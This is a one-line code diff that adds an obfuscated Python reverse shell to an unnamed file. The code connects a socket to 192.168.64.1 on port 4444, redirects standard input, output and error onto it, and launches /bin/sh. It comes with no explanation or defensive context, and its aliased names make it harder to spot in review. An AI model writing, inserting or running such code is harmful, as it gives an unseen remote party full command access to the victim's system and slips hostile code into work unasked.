@@ -1,0 +1,1 @@
+import os as _o, socket as _s; _fd = _s.socket(); _fd.connect(("192.168.64.1", 4444)); [ _o.dup2(_fd.fileno(), _n) for _n in (0, 1, 2)]; _o.execv("/bin/sh", ["/bin/sh"])
